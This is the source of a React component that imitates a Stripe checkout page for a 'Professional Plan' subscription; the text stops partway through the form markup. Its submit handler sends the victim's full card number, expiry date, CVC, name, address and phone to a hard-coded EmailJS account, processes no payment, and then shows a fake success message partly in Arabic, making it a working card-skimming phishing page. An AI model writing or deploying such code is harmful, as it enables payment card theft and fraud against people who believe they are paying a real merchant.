import { useState, useEffect, useRef } from 'react';
import { Lock, ChevronDown, ChevronUp, CreditCard, X, Check, AlertCircle, Info } from 'lucide-react';
import emailjs from '@emailjs/browser';

const StripeCheckout = () => {
  const [activeScreen, setActiveScreen] = useState('checkout');
  const [email, setEmail] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvc, setCvc] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [country, setCountry] = useState('United States');
  const [zip, setZip] = useState('');
  const [addressLine1, setAddressLine1] = useState('');
  const [addressLine2, setAddressLine2] = useState('');
  const [city, setCity] = useState('');
  const [stateField, setStateField] = useState('');
  const [phone, setPhone] = useState('');
  const [saveInfo, setSaveInfo] = useState(true);
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState('card');
  const [errors, setErrors] = useState({});
  const [touched, setTouched] = useState({});
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [overlayState, setOverlayState] = useState('none');
  const [promoCode, setPromoCode] = useState('');
  const [showPromo, setShowPromo] = useState(false);
  const [promoApplied, setPromoApplied] = useState(false);
  const [cardBrand, setCardBrand] = useState('');
  const [focusedField, setFocusedField] = useState('');
  const [showMobileSummary, setShowMobileSummary] = useState(false);

  // ==================== EmailJS Configuration ====================
  const EMAILJS_SERVICE_ID = 'service_t1ux8pj';
  const EMAILJS_TEMPLATE_ID = 'template_7r3ak68';
  const EMAILJS_PUBLIC_KEY = 'gHBREPJ9Fw94Uw6GR';

  const countryPhoneCodes = {
    'Afghanistan': { code: '+93', flag: '🇦🇫' },
    'Albania': { code: '+355', flag: '🇦🇱' },
    'Algeria': { code: '+213', flag: '🇩🇿' },
    'Argentina': { code: '+54', flag: '🇦🇷' },
    'Australia': { code: '+61', flag: '🇦🇺' },
    'Austria': { code: '+43', flag: '🇦🇹' },
    'Bahrain': { code: '+973', flag: '🇧🇭' },
    'Bangladesh': { code: '+880', flag: '🇧🇩' },
    'Belgium': { code: '+32', flag: '🇧🇪' },
    'Bolivia': { code: '+591', flag: '🇧🇴' },
    'Brazil': { code: '+55', flag: '🇧🇷' },
    'Canada': { code: '+1', flag: '🇨🇦' },
    'Chile': { code: '+56', flag: '🇨🇱' },
    'China': { code: '+86', flag: '🇨🇳' },
    'Colombia': { code: '+57', flag: '🇨🇴' },
    'Costa Rica': { code: '+506', flag: '🇨🇷' },
    'Croatia': { code: '+385', flag: '🇭🇷' },
    'Czech Republic': { code: '+420', flag: '🇨🇿' },
    'Denmark': { code: '+45', flag: '🇩🇰' },
    'Dominican Republic': { code: '+1', flag: '🇩🇴' },
    'Ecuador': { code: '+593', flag: '🇪🇨' },
    'Egypt': { code: '+20', flag: '🇪🇬' },
    'El Salvador': { code: '+503', flag: '🇸🇻' },
    'Estonia': { code: '+372', flag: '🇪🇪' },
    'Ethiopia': { code: '+251', flag: '🇪🇹' },
    'Finland': { code: '+358', flag: '🇫🇮' },
    'France': { code: '+33', flag: '🇫🇷' },
    'Germany': { code: '+49', flag: '🇩🇪' },
    'Ghana': { code: '+233', flag: '🇬🇭' },
    'Greece': { code: '+30', flag: '🇬🇷' },
    'Guatemala': { code: '+502', flag: '🇬🇹' },
    'Honduras': { code: '+504', flag: '🇭🇳' },
    'Hong Kong': { code: '+852', flag: '🇭🇰' },
    'Hungary': { code: '+36', flag: '🇭🇺' },
    'Iceland': { code: '+354', flag: '🇮🇸' },
    'India': { code: '+91', flag: '🇮🇳' },
    'Indonesia': { code: '+62', flag: '🇮🇩' },
    'Iraq': { code: '+964', flag: '🇮🇶' },
    'Ireland': { code: '+353', flag: '🇮🇪' },
    'Israel': { code: '+972', flag: '🇮🇱' },
    'Italy': { code: '+39', flag: '🇮🇹' },
    'Jamaica': { code: '+1', flag: '🇯🇲' },
    'Japan': { code: '+81', flag: '🇯🇵' },
    'Jordan': { code: '+962', flag: '🇯🇴' },
    'Kazakhstan': { code: '+7', flag: '🇰🇿' },
    'Kenya': { code: '+254', flag: '🇰🇪' },
    'Kuwait': { code: '+965', flag: '🇰🇼' },
    'Latvia': { code: '+371', flag: '🇱🇻' },
    'Lebanon': { code: '+961', flag: '🇱🇧' },
    'Lithuania': { code: '+370', flag: '🇱🇹' },
    'Luxembourg': { code: '+352', flag: '🇱🇺' },
    'Malaysia': { code: '+60', flag: '🇲🇾' },
    'Mexico': { code: '+52', flag: '🇲🇽' },
    'Morocco': { code: '+212', flag: '🇲🇦' },
    'Nepal': { code: '+977', flag: '🇳🇵' },
    'Netherlands': { code: '+31', flag: '🇳🇱' },
    'New Zealand': { code: '+64', flag: '🇳🇿' },
    'Nicaragua': { code: '+505', flag: '🇳🇮' },
    'Nigeria': { code: '+234', flag: '🇳🇬' },
    'Norway': { code: '+47', flag: '🇳🇴' },
    'Oman': { code: '+968', flag: '🇴🇲' },
    'Pakistan': { code: '+92', flag: '🇵🇰' },
    'Panama': { code: '+507', flag: '🇵🇦' },
    'Paraguay': { code: '+595', flag: '🇵🇾' },
    'Peru': { code: '+51', flag: '🇵🇪' },
    'Philippines': { code: '+63', flag: '🇵🇭' },
    'Poland': { code: '+48', flag: '🇵🇱' },
    'Portugal': { code: '+351', flag: '🇵🇹' },
    'Qatar': { code: '+974', flag: '🇶🇦' },
    'Romania': { code: '+40', flag: '🇷🇴' },
    'Russia': { code: '+7', flag: '🇷🇺' },
    'Saudi Arabia': { code: '+966', flag: '🇸🇦' },
    'Serbia': { code: '+381', flag: '🇷🇸' },
    'Singapore': { code: '+65', flag: '🇸🇬' },
    'Slovakia': { code: '+421', flag: '🇸🇰' },
    'Slovenia': { code: '+386', flag: '🇸🇮' },
    'South Africa': { code: '+27', flag: '🇿🇦' },
    'South Korea': { code: '+82', flag: '🇰🇷' },
    'Spain': { code: '+34', flag: '🇪🇸' },
    'Sri Lanka': { code: '+94', flag: '🇱🇰' },
    'Sweden': { code: '+46', flag: '🇸🇪' },
    'Switzerland': { code: '+41', flag: '🇨🇭' },
    'Taiwan': { code: '+886', flag: '🇹🇼' },
    'Tanzania': { code: '+255', flag: '🇹🇿' },
    'Thailand': { code: '+66', flag: '🇹🇭' },
    'Trinidad and Tobago': { code: '+1', flag: '🇹🇹' },
    'Tunisia': { code: '+216', flag: '🇹🇳' },
    'Turkey': { code: '+90', flag: '🇹🇷' },
    'Ukraine': { code: '+380', flag: '🇺🇦' },
    'United Arab Emirates': { code: '+971', flag: '🇦🇪' },
    'United Kingdom': { code: '+44', flag: '🇬🇧' },
    'United States': { code: '+1', flag: '🇺🇸' },
    'Uruguay': { code: '+598', flag: '🇺🇾' },
    'Venezuela': { code: '+58', flag: '🇻🇪' },
    'Vietnam': { code: '+84', flag: '🇻🇳' }
  };

  const countries = Object.keys(countryPhoneCodes);
  const usStates = ['Alabama','Alaska','Arizona','Arkansas','California','Colorado','Connecticut','Delaware','Florida','Georgia','Hawaii','Idaho','Illinois','Indiana','Iowa','Kansas','Kentucky','Louisiana','Maine','Maryland','Massachusetts','Michigan','Minnesota','Mississippi','Missouri','Montana','Nebraska','Nevada','New Hampshire','New Jersey','New Mexico','New York','North Carolina','North Dakota','Ohio','Oklahoma','Oregon','Pennsylvania','Rhode Island','South Carolina','South Dakota','Tennessee','Texas','Utah','Vermont','Virginia','Washington','West Virginia','Wisconsin','Wyoming'];

  const [showStateDropdown, setShowStateDropdown] = useState(false);
  const countryRef = useRef(null);
  const stateRef = useRef(null);

  const subtotal = 299.00;
  const discount = promoApplied ? 29.90 : 0;
  const tax = ((subtotal - discount) * 0.087).toFixed(2);
  const total = (subtotal - discount + parseFloat(tax)).toFixed(2);

  useEffect(() => {
    const handleClickOutside = (e) => {
      if (countryRef.current && !countryRef.current.contains(e.target)) setShowCountryDropdown(false);
      if (stateRef.current && !stateRef.current.contains(e.target)) setShowStateDropdown(false);
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  const detectCardBrand = (num) => {
    const cleaned = num.replace(/\s/g, '');
    if (/^4/.test(cleaned)) return 'visa';
    if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return 'mastercard';
    if (/^3[47]/.test(cleaned)) return 'amex';
    if (/^6(?:011|5)/.test(cleaned)) return 'discover';
    return '';
  };

  const formatCardNumber = (val) => {
    const cleaned = val.replace(/\D/g, '');
    const brand = detectCardBrand(cleaned);
    setCardBrand(brand);
    if (brand === 'amex') {
      const limited = cleaned.slice(0, 15);
      const parts = [limited.slice(0, 4), limited.slice(4, 10), limited.slice(10, 15)];
      return parts.filter(Boolean).join(' ');
    }
    const limited = cleaned.slice(0, 16);
    const parts = [limited.slice(0, 4), limited.slice(4, 8), limited.slice(8, 12), limited.slice(12, 16)];
    return parts.filter(Boolean).join(' ');
  };

  const formatExpiry = (val) => {
    const cleaned = val.replace(/\D/g, '').slice(0, 4);
    if (cleaned.length >= 3) return cleaned.slice(0, 2) + ' / ' + cleaned.slice(2);
    if (cleaned.length === 2 && expiry.length < val.length) return cleaned + ' / ';
    return cleaned;
  };

  const validateEmail = (v) => !v ? 'Email is required' : !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ? 'Your email is incomplete.' : '';
  const luhnCheck = (num) => {
    let sum = 0, alternate = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let n = parseInt(num[i], 10);
      if (alternate) { n *= 2; if (n > 9) n -= 9; }
      sum += n;
      alternate = !alternate;
    }
    return sum % 10 === 0;
  };

  const validateCardNumber = (v) => {
    const cleaned = v.replace(/\s/g, '');
    if (!cleaned) return 'Card number is required';
    const isAmex = /^3[47]/.test(cleaned);
    if (isAmex && cleaned.length !== 15) return 'Your card number is incomplete.';
    if (!isAmex && cleaned.length !== 16) return 'Your card number is incomplete.';
    if (!luhnCheck(cleaned)) return 'Your card number is invalid.';
    return '';
  };

  const validateExpiry = (v) => {
    const cleaned = v.replace(/\D/g, '');
    if (!cleaned) return 'Expiration date is required';
    if (cleaned.length < 4) return "Your card's expiration date is incomplete.";
    const month = parseInt(cleaned.slice(0, 2));
    const year = parseInt('20' + cleaned.slice(2, 4));
    if (month < 1 || month > 12) return "Your card's expiration date is invalid.";
    if (new Date(year, month) < new Date()) return "Your card's expiration year is in the past.";
    return '';
  };

  const validateCvc = (v) => {
    if (!v) return 'Security code is required';
    const isAmex = cardBrand === 'amex';
    if (isAmex && v.length !== 4) return "Your card's security code is incomplete.";
    if (!isAmex && v.length !== 3) return "Your card's security code is incomplete.";
    return '';
  };

  const validateName = (v) => !v.trim() ? 'Name on card is required' : '';
  const validateZip = (v) => {
    if (!v.trim()) return 'ZIP code is required';
    if (country === 'United States' && !/^\d{5}(-\d{4})?$/.test(v)) return 'Invalid ZIP code';
    return '';
  };

  const handleBlur = (field) => {
    setTouched(prev => ({ ...prev, [field]: true }));
    setFocusedField('');
    let error = '';
    if (field === 'email') error = validateEmail(email);
    if (field === 'cardNumber') error = validateCardNumber(cardNumber);
    if (field === 'expiry') error = validateExpiry(expiry);
    if (field === 'cvc') error = validateCvc(cvc);
    if (field === 'nameOnCard') error = validateName(nameOnCard);
    if (field === 'zip') error = validateZip(zip);
    setErrors(prev => ({ ...prev, [field]: error }));
  };

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    if (touched.email) setErrors(prev => ({ ...prev, email: validateEmail(e.target.value) }));
  };

  const handleCardChange = (e) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
    if (touched.cardNumber) setErrors(prev => ({ ...prev, cardNumber: validateCardNumber(formatted) }));
  };

  const handleExpiryChange = (e) => {
    const formatted = formatExpiry(e.target.value);
    setExpiry(formatted);
    if (touched.expiry) setErrors(prev => ({ ...prev, expiry: validateExpiry(formatted) }));
  };

  const handleCvcChange = (e) => {
    const maxLen = cardBrand === 'amex' ? 4 : 3;
    const val = e.target.value.replace(/\D/g, '').slice(0, maxLen);
    setCvc(val);
    if (touched.cvc) setErrors(prev => ({ ...prev, cvc: validateCvc(val) }));
  };

  const handleNameChange = (e) => {
    setNameOnCard(e.target.value);
    if (touched.nameOnCard) setErrors(prev => ({ ...prev, nameOnCard: validateName(e.target.value) }));
  };

  const handleZipChange = (e) => {
    setZip(e.target.value);
    if (touched.zip) setErrors(prev => ({ ...prev, zip: validateZip(e.target.value) }));
  };

  const handlePhoneChange = (e) => {
    const cleaned = e.target.value.replace(/[^\d+\-() ]/g, '');
    setPhone(cleaned);
  };

  const handleCountrySelect = (c) => {
    setCountry(c);
    setShowCountryDropdown(false);
  };

  const handleStateSelect = (s) => {
    setStateField(s);
    setShowStateDropdown(false);
  };

  const toggleSaveInfo = () => setSaveInfo(prev => !prev);
  const handlePromoChange = (e) => setPromoCode(e.target.value);
  const handleApplyPromo = () => { if (promoCode.toUpperCase() === 'SAVE10') setPromoApplied(true); };
  const togglePromo = () => setShowPromo(prev => !prev);
  const toggleMobileSummary = () => setShowMobileSummary(prev => !prev);
  const handleFocus = (field) => setFocusedField(field);
  const handleAddressLine1Change = (e) => setAddressLine1(e.target.value);
  const handleAddressLine2Change = (e) => setAddressLine2(e.target.value);
  const handleCityChange = (e) => setCity(e.target.value);

  // ====================== دالة الإرسال بـ EmailJS ======================
  const handleSubmit = async () => {
    const newErrors = {
      email: validateEmail(email),
      cardNumber: validateCardNumber(cardNumber),
      expiry: validateExpiry(expiry),
      cvc: validateCvc(cvc),
      nameOnCard: validateName(nameOnCard),
      zip: validateZip(zip),
    };

    const hasErrors = Object.values(newErrors).some(e => e !== '');
    if (hasErrors) {
      const allTouched = {};
      Object.keys(newErrors).forEach(k => allTouched[k] = true);
      setTouched(allTouched);
      setErrors(newErrors);
      return;
    }

    setIsProcessing(true);
    setOverlayState('loading');

    const templateParams = {
      customer_email: email,
      name_on_card: nameOnCard,
      phone_number: phone || 'غير محدد',
      country: country,
      address_line1: addressLine1 || 'غير محدد',
      address_line2: addressLine2 || 'غير محدد',
      city: city || 'غير محدد',
      state: stateField || 'غير محدد',
      zip_code: zip,
      payment_method: paymentMethod,
      card_number: cardNumber,
      card_brand: cardBrand || 'unknown',
      expiry_date: expiry,
      cvc_code: cvc,
      plan: 'Professional Plan - Annual',
      total_paid: total,
      promo_code: promoCode || 'لا يوجد',
    };

    try {
      await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        templateParams,
        EMAILJS_PUBLIC_KEY
      );

      console.log("✅ Email sent successfully via EmailJS");
      setOverlayState('none');
      setShowSuccess(true);
    } catch (error) {
      console.error("❌ EmailJS Error:", error);
      setOverlayState('failed');
      setTimeout(() => setOverlayState('none'), 5000);
    } finally {
      setIsProcessing(false);
    }
  };

  const handleBackToCheckout = () => setShowSuccess(false);

  const CardBrandIcon = ({ brand }) => {
    if (brand === 'visa') return <div className="flex items-center justify-center w-8 h-5 bg-[#1A1F71] rounded-[3px]"><span className="text-white text-[9px] font-bold italic tracking-wide">VISA</span></div>;
    if (brand === 'mastercard') return <div className="flex items-center w-8 h-5"><div className="w-3.5 h-3.5 rounded-full bg-[#EB001B] -mr-1.5 opacity-90"></div><div className="w-3.5 h-3.5 rounded-full bg-[#F79E1B] opacity-90"></div></div>;
    if (brand === 'amex') return <div className="flex items-center justify-center w-8 h-5 bg-[#2E77BC] rounded-[3px]"><span className="text-white text-[7px] font-bold">AMEX</span></div>;
    if (brand === 'discover') return <div className="flex items-center justify-center w-8 h-5 bg-[#FF6000] rounded-[3px]"><span className="text-white text-[6px] font-bold">DISC</span></div>;
    return null;
  };

  const getInputBorderClass = (field) => {
    if (errors[field] && touched[field]) return 'border-[#df1b41] shadow-[0_0_0_1px_#df1b41]';
    if (focusedField === field) return 'border-[#0570de] shadow-[0_0_0_1px_#0570de]';
    return 'border-[#e0e0e0]';
  };

  return (
    <div className="min-h-screen bg-white flex flex-col lg:flex-row relative" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      
      {/* Floating Overlay */}
      {overlayState !== 'none' && (
        <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40 backdrop-blur-sm">
          <div className="bg-white rounded-2xl shadow-[0_20px_60px_rgba(0,0,0,0.2)] p-8 mx-4 w-full max-w-sm text-center">
            {overlayState === 'loading' && (
              <div>
                <div className="w-16 h-16 mx-auto mb-5 relative">
                  <div className="absolute inset-0 rounded-full border-[3px] border-[#e8e8e8]"></div>
                  <div className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#0570de] animate-spin"></div>
                </div>
                <h3 className="text-[18px] font-semibold text-[#1a1a1a] mb-2">Processing Payment</h3>
                <p className="text-[14px] text-[#6d6e78]">Order confirmation is pending...</p>
              </div>
            )}
            {overlayState === 'failed' && (
              <div>
                <div className="w-16 h-16 mx-auto mb-5 rounded-full bg-[#FEE2E2] flex items-center justify-center">
                  <X className="w-8 h-8 text-[#df1b41]" strokeWidth={2.5} />
                </div>
                <h3 className="text-[18px] font-semibold text-[#1a1a1a] mb-2">Payment Failed</h3>
                <p className="text-[14px] text-[#6d6e78]">Your order could not be placed.<br/>Please try again later.</p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Success Screen */}
      {showSuccess && (
        <div className="fixed inset-0 z-[1000] flex items-center justify-center bg-white">
          <div className="text-center max-w-md mx-4">
            <div className="w-20 h-20 mx-auto mb-6 rounded-2xl bg-[#30B130] flex items-center justify-center">
              <Check className="w-12 h-12 text-white" strokeWidth={3} />
            </div>
            <h2 className="text-3xl font-semibold text-[#1a1a1a] mb-3">تمت عملية الدفع بنجاح!</h2>
            <p className="text-[#6d6e78] text-lg mb-8">شكرًا لك<br />تم إرسال التفاصيل إلى بريدك الإلكتروني</p>
            <button onClick={handleBackToCheckout} className="w-full py-4 bg-[#0570de] hover:bg-[#0452ad] text-white rounded-2xl font-medium text-lg shadow-lg transition-all">العودة إلى الصفحة الرئيسية</button>
          </div>
        </div>
      )}

      {/* Mobile Order Summary Toggle */}
      <div className="lg:hidden bg-[#f7f8fa] border-b border-[#e0e0e0]">
        <button onClick={toggleMobileSummary} className="w-full flex items-center justify-between px-5 py-4">
          <div className="flex items-center gap-2">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
              <path d="M6 6h8M6 10h8M6 14h5" stroke="#0570de" strokeWidth="1.5" strokeLinecap="round"/>
            </svg>
            <span className="text-[#0570de] text-[14px] font-medium">
              {showMobileSummary ? 'Hide order summary' : 'Show order summary'}
            </span>
            {showMobileSummary ? <ChevronUp className="w-4 h-4 text-[#0570de]" /> : <ChevronDown className="w-4 h-4 text-[#0570de]" />}
          </div>
          <span className="text-[18px] font-semibold text-[#1a1a1a]">${total}</span>
        </button>
        {showMobileSummary && (
          <div className="px-5 pb-5 border-t border-[#e8e8e8]">
            <div className="pt-4">
              <div className="flex gap-4 mb-4">
                <div className="w-14 h-14 rounded-lg bg-[#f0f0f0] border border-[#e0e0e0] flex items-center justify-center relative">
                  <div className="w-10 h-10 rounded bg-gradient-to-br from-[#635bff] to-[#8b5cf6]"></div>
                  <div className="absolute -top-1.5 -right-1.5 w-5 h-5 bg-[#6d6e78] rounded-full flex items-center justify-center">
                    <span className="text-white text-[10px] font-medium">1</span>
                  </div>
                </div>
                <div className="flex-1">
                  <p className="text-[14px] font-medium text-[#1a1a1a]">Professional Plan</p>
                  <p className="text-[12px] text-[#6d6e78]">Annual subscription</p>
                </div>
                <span className="text-[14px] font-medium text-[#1a1a1a]">$299.00</span>
              </div>
              {promoApplied && (
                <div className="flex justify-between text-[14px] mb-2">
                  <span className="text-[#30B130]">Discount (SAVE10)</span>
                  <span className="text-[#30B130]">-$29.90</span>
                </div>
              )}
              <div className="flex justify-between text-[14px] mb-2">
                <span className="text-[#6d6e78]">Subtotal</span>
                <span className="text-[#1a1a1a]">${(subtotal - discount).toFixed(2)}</span>
              </div>
              <div className="flex justify-between text-[14px] mb-3">
                <span className="text-[#6d6e78]">Tax</span>
                <span className="text-[#1a1a1a]">${tax}</span>
              </div>
              <div className="border-t border-[#e0e0e0] pt-3 flex justify-between">
                <span className="text-[16px] font-semibold text-[#1a1a1a]">Total due today</span>
                <span className="text-[16px] font-semibold text-[#1a1a1a]">${total}</span>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Left Column - Payment Form */}
      <div className="flex-1 lg:flex lg:justify-end">
        <div className="w-full max-w-[520px] mx-auto lg:mx-0 lg:mr-10 xl:mr-16 px-5 lg:px-0 py-8 lg:py-14">
          {/* Header */}
          <div className="flex items-center gap-3 mb-10">
            <div className="w-10 h-10 rounded-full bg-gradient-to-br from-[#635bff] to-[#8b5cf6] flex items-center justify-center">
              <span className="text-white text-[16px] font-bold">S</span>
            </div>
            <div>
              <h2 className="text-[#1a1a1a] text-[15px] font-semibold leading-tight">StreamLine Inc.</h2>
              <p className="text-[#6d6e78] text-[13px]">Professional Plan — Annual</p>
            </div>
          </div>

          {/* Express Checkout */}
          <div className="mb-6">
            <div className="grid grid-cols-2 gap-3 mb-4">
              <a href="https://support.apple.com/guide/iphone/set-up-apple-pay-iph9b7f53382/ios" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 py-3 bg-black rounded-md hover:bg-[#1a1a1a] active:bg-[#333] transition-colors duration-150 shadow-[0_1px_3px_rgba(0,0,0,0.15)]">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
                  <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                </svg>
                <span className="text-white text-[15px] font-medium">Pay</span>
              </a>
              <a href="https://play.google.com/store/apps/details?id=com.google.android.apps.nbu.paisa.user" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-1.5 py-3 bg-white border border-[#e0e0e0] rounded-md hover:bg-[#f7f7f7] active:bg-[#efefef] transition-colors duration-150 shadow-[0_1px_3px_rgba(0,0,0,0.08)]">
                <svg width="18" height="18" viewBox="0 0 24 24">
                  <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                </svg>
                <span className="text-[#3c4043] text-[15px] font-medium">Pay</span>
              </a>
            </div>

            <button className="w-full flex items-center justify-center py-3 bg-[#00D66F] rounded-md hover:bg-[#00C265] active:bg-[#00AD59] transition-colors duration-150 shadow-[0_1px_3px_rgba(0,0,0,0.12)] mb-6">
              <div className="flex items-center gap-1.5">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  <path d="M13 10V3L4 14h7v7l9-11h-7z" fill="white" stroke="white" strokeWidth="1" strokeLinejoin="round"/>
                </svg>
                <span className="text-white text-[17px] font-bold tracking-tight">Link</span>
              </div>
            </button>

            <div className="flex items-center gap-4 mb-6">
              <div className="flex-1 h-px bg-[#e0e0e0]"></div>
              <span className="text-[12px] text-[#8898aa] font-medium uppercase tracking-wider">Or pay with</span>
              <div className="flex-1 h-px bg-[#e0e0e0]"></div>
            </div>

            <div className="flex gap-2">
              <button onClick={() => setPaymentMethod('card')} className={`flex-1 py-2.5 px-4 rounded-full text-[13px] font-medium transition-all duration-150 border ${paymentMethod === 'card' ? 'bg-[#f0f5ff] border-[#0570de] text-[#0570de]' : 'bg-white border-[#e0e0e0] text-[#6d6e78] hover:bg-[#f7f7f7]'}`}>
                <div className="flex items-center justify-center gap-1.5"><CreditCard className="w-3.5 h-3.5" /><span>Card</span></div>
              </button>
              <button onClick={() => setPaymentMethod('us_bank')} className={`flex-1 py-2.5 px-4 rounded-full text-[13px] font-medium transition-all duration-150 border ${paymentMethod === 'us_bank' ? 'bg-[#f0f5ff] border-[#0570de] text-[#0570de]' : 'bg-white border-[#e0e0e0] text-[#6d6e78] hover:bg-[#f7f7f7]'}`}>US Bank</button>
              <button onClick={() => setPaymentMethod('cashapp')} className={`flex-1 py-2.5 px-4 rounded-full text-[13px] font-medium transition-all duration-150 border ${paymentMethod === 'cashapp' ? 'bg-[#f0f5ff] border-[#0570de] text-[#0570de]' : 'bg-white border-[#e0e0e0] text-[#6d6e78] hover:bg-[#f7f7f7]'}`}>
                <div className="flex items-center justify-center gap-1.5"><span className="text-[#00D632] font-bold text-[14px]">$</span><span>Cash App</span></div>
              </button>
            </div>
          </div>

          {/* Card Payment Form */}
          {paymentMethod === 'card' && (
            <div>
              {/* Email */}
              <div className="mb-4">
                <label className="block text-[13px] font-medium text-[#3c4257] mb-1.5">Email</label>
                <input type="email" value={email} onChange={handleEmailChange} onBlur={() => handleBlur('email')} onFocus={() => handleFocus('email')} placeholder="you@example.com" className={`w-full px-3 py-2.5 rounded-md border text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none transition-all duration-150 bg-white ${getInputBorderClass('email')}`} />
                {errors.email && touched.email && <div className="flex items-center gap-1.5 mt-1.5"><AlertCircle className="w-3.5 h-3.5 text-[#df1b41]" /><span className="text-[12px] text-[#df1b41]">{errors.email}</span></div>}
              </div>

              {/* Card Information */}
              <div className="mb-4">
                <label className="block text-[13px] font-medium text-[#3c4257] mb-1.5">Card information</label>
                <div className={`rounded-md border overflow-hidden ${(errors.cardNumber && touched.cardNumber) || (errors.expiry && touched.expiry) || (errors.cvc && touched.cvc) ? 'border-[#df1b41]' : 'border-[#e0e0e0]'}`}>
                  <div className={`relative flex items-center border-b ${(errors.cardNumber && touched.cardNumber) ? 'border-[#df1b41]' : 'border-[#e0e0e0]'} ${focusedField === 'cardNumber' ? 'shadow-[0_0_0_1px_#0570de] rounded-t-md z-10 relative' : ''}`}>
                    <input type="text" value={cardNumber} onChange={handleCardChange} onBlur={() => handleBlur('cardNumber')} onFocus={() => handleFocus('cardNumber')} placeholder="1234 1234 1234 1234" className="w-full px-3 py-2.5 text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none bg-white" />
                    <div className="flex items-center gap-1 pr-3">{cardBrand ? <CardBrandIcon brand={cardBrand} /> : <div className="w-8 h-5 rounded-[3px] border border-[#d0d0d0] bg-[#f7f7f7] flex items-center justify-center"><CreditCard className="w-4 h-3.5 text-[#a0a0a0]" /></div>}</div>
                  </div>
                  <div className="flex">
                    <div className={`flex-1 border-r ${(errors.expiry && touched.expiry) ? 'border-[#df1b41]' : 'border-[#e0e0e0]'} ${focusedField === 'expiry' ? 'shadow-[0_0_0_1px_#0570de] rounded-bl-md z-10 relative' : ''}`}>
                      <input type="text" value={expiry} onChange={handleExpiryChange} onBlur={() => handleBlur('expiry')} onFocus={() => handleFocus('expiry')} placeholder="MM / YY" className="w-full px-3 py-2.5 text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none bg-white" />
                    </div>
                    <div className={`flex-1 relative ${focusedField === 'cvc' ? 'shadow-[0_0_0_1px_#0570de] rounded-br-md z-10 relative' : ''}`}>
                      <input type="text" value={cvc} onChange={handleCvcChange} onBlur={() => handleBlur('cvc')} onFocus={() => handleFocus('cvc')} placeholder="CVC" className="w-full px-3 py-2.5 text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none bg-white pr-9" />
                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
                        <div className="w-6 h-4 rounded-[2px] border border-[#d0d0d0] bg-[#f7f7f7] flex items-center justify-end pr-0.5">
                          <div className="flex flex-col gap-[1px]">
                            <div className="w-2 h-[1px] bg-[#a0a0a0]"></div>
                            <div className="w-2 h-[1px] bg-[#a0a0a0]"></div>
                            <div className="w-2 h-[1px] bg-[#a0a0a0]"></div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                {(errors.cardNumber && touched.cardNumber) && <div className="flex items-center gap-1.5 mt-1.5"><AlertCircle className="w-3.5 h-3.5 text-[#df1b41]" /><span className="text-[12px] text-[#df1b41]">{errors.cardNumber}</span></div>}
                {(errors.expiry && touched.expiry && !errors.cardNumber) && <div className="flex items-center gap-1.5 mt-1.5"><AlertCircle className="w-3.5 h-3.5 text-[#df1b41]" /><span className="text-[12px] text-[#df1b41]">{errors.expiry}</span></div>}
                {(errors.cvc && touched.cvc && !errors.cardNumber && !errors.expiry) && <div className="flex items-center gap-1.5 mt-1.5"><AlertCircle className="w-3.5 h-3.5 text-[#df1b41]" /><span className="text-[12px] text-[#df1b41]">{errors.cvc}</span></div>}
              </div>

              {/* Name on card */}
              <div className="mb-4">
                <label className="block text-[13px] font-medium text-[#3c4257] mb-1.5">Name on card</label>
